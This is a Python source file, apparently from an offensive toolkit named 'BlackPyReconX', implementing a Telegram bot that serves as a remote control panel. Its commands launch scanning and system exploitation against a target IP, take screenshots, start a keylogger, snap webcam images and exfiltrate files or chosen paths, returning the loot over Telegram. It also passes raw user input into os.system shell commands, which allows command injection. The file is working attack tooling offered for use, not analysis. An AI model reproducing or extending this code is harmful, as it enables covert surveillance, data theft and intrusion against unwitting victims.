import os
import asyncio
from pathlib import Path
from telegram import Update, InputFile
from telegram.ext import (
    ApplicationBuilder, Application, CommandHandler, ContextTypes
)

from modules.utils import get_api_keys

# === Clés API ===
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")

# === Répertoires ===
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
SCREENSHOTS = OUTPUTS / "screenshots"

# === Commandes ===

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
        "🔍 `/osint <ip|domaine>`\n"
        "🛠️ `/scan <ip>`\n"
        "💥 `/exploit_sys <ip>`\n"
        "📸 `/screenshot`\n"
        "🎹 `/keylogger_start`\n"
        "📷 `/webcam_snap`\n"
        "📤 `/exfiltrate`\n"
        "📂 `/exfiltrate_path <chemin>`\n"
        "🧾 `/rapport`\n",
        parse_mode="Markdown"
    )

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /osint <ip ou domaine>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --osint")
    await update.message.reply_document(InputFile(OUTPUTS / "osint.txt"))

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /scan <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --scan")
    await update.message.reply_document(InputFile(OUTPUTS / "scan_results.txt"))

async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exploit_sys <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --exploit_sys")
    await update.message.reply_text("✅ Exploitation système lancée.")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --screenshot")
    screenshot_path = SCREENSHOTS / "screenshot_latest.png"
    if screenshot_path.exists():
        await update.message.reply_document(InputFile(screenshot_path))
    else:
        await update.message.reply_text("❌ Aucune capture trouvée.")

async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --keylogger")
    await update.message.reply_text("🎹 Keylogger démarré.")

async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --webcam")
    webcam_path = SCREENSHOTS / "webcam_latest.png"
    if webcam_path.exists():
        await update.message.reply_document(InputFile(webcam_path))
    else:
        await update.message.reply_text("❌ Aucune image webcam trouvée.")

async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --exfil")
    archive = OUTPUTS / "exfiltrated.zip"
    if archive.exists():
        await update.message.reply_document(InputFile(archive))
    else:
        await update.message.reply_text("❌ Aucune archive exfiltrée trouvée.")

async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exfiltrate_path <chemin>")
    chemin = " ".join(context.args)
    os.system(f"python main.py --exfiltrate_path \"{chemin}\"")
    await update.message.reply_text(f"📂 Exfiltration de `{chemin}` terminée.", parse_mode="Markdown")

async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/reporting.py")
    rapport_path = OUTPUTS / "rapport_final.txt"
    if rapport_path.exists():
        await update.message.reply_document(InputFile(rapport_path))
    else:
        await update.message.reply_text("❌ Rapport introuvable.")

# === Lancement ===

async def main():
    app: Application = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("osint", osint))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("exploit_sys", exploit_sys))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("keylogger_start", keylogger_start))
    app.add_handler(CommandHandler("webcam_snap", webcam_snap))
    app.add_handler(CommandHandler("exfiltrate", exfiltrate))
    app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
    app.add_handler(CommandHandler("rapport", rapport))

    print("🤖 Bot Telegram lancé avec succès.")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
